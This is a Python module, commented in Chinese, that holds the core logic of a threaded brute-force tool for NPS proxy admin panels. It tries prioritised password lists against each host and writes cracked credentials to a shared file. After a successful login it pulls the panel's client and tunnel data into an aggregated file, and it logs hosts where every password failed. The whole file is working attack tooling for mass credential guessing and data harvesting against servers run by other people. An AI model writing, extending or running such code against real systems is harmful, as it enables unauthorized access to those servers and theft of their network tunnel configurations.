# -*- coding: utf-8 -*-
# 核心逻辑模块 - 包含对单个目标主机执行暴力破解、获取数据和处理结果的核心函数。

import requests # 导入 requests 库，用于发送网络请求
import time     # 导入 time 模块，用于处理延时
import sys      # 导入 sys 模块，用于打印到标准错误或标准输出
import os       # 导入 os 模块，用于文件路径操作
import json     # 导入 json 模块，用于处理 JSON 数据
from threading import Lock # 导入 Lock 类，用于线程同步，确保文件写入安全

# 导入自定义模块 (已修改为绝对导入)
from nps_auth import try_password # 从认证模块导入尝试密码函数
# 导入数据获取和格式化函数 (format_tunnel_data 现在返回列表)
from nps_data import get_nps_client_data, get_nps_tunnel_data, format_tunnel_data
# Import constants needed here
from nps_constants import DEFAULT_AGGREGATED_TUNNELS_FILE


# 定义 DummyPbar 类 - 当不使用 tqdm 库时，提供一个具有 write 方法的模拟进度条对象，以兼容代码。
class DummyPbar:
    """A dummy progress bar that prints messages directly."""
    def write(self, msg, file=None):
        # 在单目标详细模式下，直接使用 print 打印信息
        print(msg, file=file if file is not None else sys.stdout)
    def update(self, n=1): # Add default n=1
        pass # Dummy 对象不执行更新操作
    def __enter__(self):
        return self # 支持 with 语句上下文管理
    def __exit__(self, exc_type, exc_val, exc_tb):
        pass # 支持 with 语句上下文管理


def brute_host(host, username, passwords, out_fp, lock, delay, verbose, pbar, max_failures_per_host, get_clients, save_data, get_tunnels, client_api_path, tunnel_api_path, tunnel_page_limit, priority_passwords_set, tunnel_fp=None, tunnel_lock=None, fail_fp=None, fail_lock=None):
    """
    对单个目标主机进行暴力破解，尝试密码列表中的密码。
    如果成功登录，可选地获取客户端和隧道数据。
    如果所有密码均尝试失败，则将该主机写入失败文件。

    Args:
        host (str): 目标主机的地址 (格式: host:port)。
        username (str): 尝试登录的用户名。
        passwords (list): 包含要尝试的密码字符串的列表 (priority first).
        out_fp (file): 用于写入成功账号密码的文件的文件句柄。
        lock (threading.Lock): 用于保护成功账号密码文件写入的线程锁。
        delay (float): 每次密码尝试之间的延时（秒）。
        verbose (bool): 是否启用详细输出模式。
        pbar (tqdm.Tqdm or DummyPbar): 进度条对象，用于安全打印信息。
        max_failures_per_host (int): 对同一主机允许的最大网络错误或超时次数。
        get_clients (bool): 是否在成功登录后获取客户端数据。
        save_data (bool): 是否保存获取到的数据。
        get_tunnels (bool): 是否在成功登录后获取隧道数据。
        client_api_path (str): API path for client data.
        tunnel_api_path (str): API path for tunnel data.
        tunnel_page_limit (int): Page size for tunnel data fetching.
        priority_passwords_set (set): Set of priority passwords.
        tunnel_fp (file, optional): 隧道数据聚合文件的文件句柄。
        tunnel_lock (threading.Lock, optional): 用于保护隧道数据聚合文件写入的线程锁。
        fail_fp (file, optional): 用于写入爆破失败目标的文件的文件句柄。
        fail_lock (threading.Lock, optional): 用于保护失败目标文件写入的线程锁。

    Returns:
        tuple: 返回一个包含三个布尔值的元组 (found_success, got_client_data, wrote_tunnel_data)。
               - found_success: 是否成功登录了该主机。
               - got_client_data: 是否成功获取到了非空的客户端数据列表。
               - wrote_tunnel_data: 是否成功获取到了非空的隧道数据并写入了至少一行。
    """
    found_success = False # 标志，指示是否找到了成功的密码
    network_failure_count = 0 # 计数器，记录当前主机遇到的网络错误或超时次数
    got_client_data_flag = False # 标志，指示是否成功获取了客户端数据
    wrote_tunnel_data_flag = False # 标志，指示是否成功获取并写入了至少一行隧道数据

    output_func = pbar.write if pbar else print # 选择输出函数

    # --- 内部函数：处理隧道数据获取和写入 ---
    def process_tunnel_data(session, host, scheme, username, password):
        nonlocal wrote_tunnel_data_flag # 允许修改外部函数的标志
        tunnels_written_count = 0 # 记录为当前主机写入的隧道行数

        if not get_tunnels: # 如果未指定 -T，则直接返回
             if verbose and not get_clients: # 仅在未获取客户端时打印跳过信息
                 output_func(f"[*] {host} 登录成功 ({username}/{password})，但已跳过隧道数据获取 (未指定 -T)。", file=sys.stdout)
             return

        tunnels_list = get_nps_tunnel_data(session, host, scheme, username, password, tunnel_api_path, tunnel_page_limit, verbose, pbar)

        if not tunnels_list: # 如果未获取到隧道列表
             if verbose:
                 output_func(f"[*] {host} 未获取到隧道列表数据或获取失败。", file=sys.stdout)
             return # 直接返回

        aggregated_file = tunnel_fp.name if tunnel_fp else DEFAULT_AGGREGATED_TUNNELS_FILE
        if save_data and tunnel_fp and tunnel_lock:
            try:
                host_ip = host.split(':')[0] # 提取目标主机的 IP 地址部分
                lines_to_write = [] # 存储所有需要写入的行

                if verbose:
                    output_func(f"[*] {host} 获取到 {len(tunnels_list)} 条原始隧道条目，正在处理并准备写入聚合文件...")

                for tunnel in tunnels_list:
                    formatted_tunnel_lines = format_tunnel_data(tunnel, host_ip, verbose, pbar)
                    if formatted_tunnel_lines:
                        lines_to_write.extend(formatted_tunnel_lines)

                if lines_to_write:
                    with tunnel_lock:
                        for line_to_write in lines_to_write:
                            tunnel_fp.write(line_to_write + "\n")
                        tunnel_fp.flush()
                    tunnels_written_count = len(lines_to_write)
                    wrote_tunnel_data_flag = True

                    if verbose:
                        output_func(f"[✔] {host} 的 {tunnels_written_count} 行隧道数据已写入聚合文件 {aggregated_file}", file=sys.stdout)
                elif verbose:
                    output_func(f"[*] {host} 未从获取到的 {len(tunnels_list)} 条原始条目中解析出有效的隧道数据写入聚合文件。", file=sys.stdout)

            except Exception as e:
                if verbose:
                    output_func(f"[-] 错误：写入 {host} 的隧道数据到聚合文件 {aggregated_file} 失败: {e}", file=sys.stderr)
        elif verbose:
             output_func(f"[*] {host} 获取到 {len(tunnels_list)} 条原始隧道条目，但未启用保存 (-S) 或文件写入设置不完整，数据未写入文件。", file=sys.stdout)

    # --- 内部函数：处理客户端数据获取 ---
    def process_client_data(session, host, scheme, username, password):
        nonlocal got_client_data_flag # 允许修改外部函数的标志

        if not get_clients:
             if verbose and not get_tunnels:
                 output_func(f"[*] {host} 登录成功 ({username}/{password})，但已跳过客户端数据获取 (未指定 -C)。", file=sys.stdout)
             return

        client_data = get_nps_client_data(session, host, scheme, username, password, client_api_path, verbose, pbar, save_data)
        if client_data is not None and client_data.get("rows"):
            got_client_data_flag = True
        elif verbose:
             output_func(f"[*] {host} 未获取到客户端列表数据或列表为空。", file=sys.stdout)

    # --- 主要暴力破解逻辑 ---
    with requests.Session() as session:
        if verbose:
            priority_count = len(priority_passwords_set)
            total_count = len(passwords)
            output_func(f"[*] {host} 开始尝试 {total_count} 个密码 (优先: {priority_count}, 其余: {total_count - priority_count})...")

        for pwd in passwords:
            if found_success: break
            if network_failure_count >= max_failures_per_host: break

            success, scheme, status = try_password(session, host, username, pwd, verbose, pbar)

            if status.startswith("network_"):
                network_failure_count += 1
                if verbose:
                    error_type = status.replace('network_', '').replace('_', ' ')
                    output_func(f"[*] {host} 尝试 {username}/{pwd} 时发生网络错误 ({error_type})，计数: {network_failure_count}/{max_failures_per_host}", file=sys.stderr)
                if network_failure_count >= max_failures_per_host:
                    if verbose:
                        output_func(f"[!] {host} 网络错误或超时次数 ({network_failure_count}) 已达到阈值 ({max_failures_per_host})，跳过剩余密码尝试。", file=sys.stderr)

            elif status == "success":
                base = f"{scheme}://{host}"
                line = f"{base} -> {username}={pwd}\n"
                output_func(f"[✔] {base} NPS 登录成功，密码：{pwd}")
                with lock:
                    out_fp.write(line)
                    out_fp.flush()
                found_success = True

                process_client_data(session, host, scheme, username, pwd)
                process_tunnel_data(session, host, scheme, username, pwd)

                if verbose and not get_clients and not get_tunnels:
                    output_func(f"[*] {host} 登录成功 ({username}/{pwd})，已跳过所有额外数据获取 (未指定 -C 和 -T)。", file=sys.stdout)

            if delay > 0 and not found_success and network_failure_count < max_failures_per_host:
                 time.sleep(delay)

    # --- 循环结束后 ---
    # 如果未找到成功密码且不是因为网络错误次数过多而中断
    if not found_success and network_failure_count < max_failures_per_host:
        if verbose: # 在详细模式下打印所有密码尝试均失败的信息
            output_func(f"[✘] {host} 所有密码尝试完成，未发现成功登录。")
        
        # --- 新增功能：将爆破失败的目标写入文件 ---
        if fail_fp and fail_lock:
            try:
                with fail_lock:
                    fail_fp.write(host + "\n")
                    fail_fp.flush()
            except Exception as e:
                if verbose:
                    output_func(f"[-] 错误: 写入失败目标 {host} 到文件失败: {e}", file=sys.stderr)
        # --- 新增功能结束 ---

    # 返回本次函数调用的结果状态
    return found_success, got_client_data_flag, wrote_tunnel_data_flag
